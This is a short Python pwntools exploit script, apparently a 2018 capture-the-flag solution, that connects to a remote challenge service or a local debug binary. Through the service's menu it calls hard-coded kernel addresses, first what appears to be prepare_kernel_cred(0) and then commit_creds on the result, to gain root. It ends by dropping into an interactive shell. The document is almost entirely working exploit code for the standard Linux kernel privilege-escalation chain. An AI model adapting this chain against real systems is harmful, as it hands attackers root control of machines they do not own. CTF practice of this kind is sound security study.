#! /usr/bin/env python
# -*- coding: utf-8 -*-
#
# Copyright © 2018 hzshang <hzshang15@gmail.com>

from pwn import *
context.log_level="debug"
#libc=ELF("./libc.so.6")
#heap_add=0
#stack_add=0
if len(sys.argv)==1:
    r=process(["bash","-c","./debug"])
    pid=r.pid
else:
    r=remote("arcade.fluxfingers.net",1817)
    pid=0

def debug():
    log.debug("process pid:%d"%pid)
    #log.debug("stack add:0x%x"%stack_add)
    #log.debug("heap add:0x%x"%heap_add)
    #log.debug("libc add:0x%x"%libc.address)
    pause()

def call(func,para):
    r.sendlineafter("5. Bye!\r\r\n>","1")
    r.sendlineafter("though or we will crash horribly...",str(func))
    r.sendlineafter("There is a good chance we will want to pass an argument. Which one is it?",str(para))
    r.recvuntil("I even got a return value for you...\r\r\nIt is: ")
    return r.recvline()[:-2]

cred_func=0xFFFFFFFF8104EE50
commit_creds=0xFFFFFFFF8104E9D0
cred=int(call(cred_func,0),16)
call(commit_creds,cred)
r.interactive()
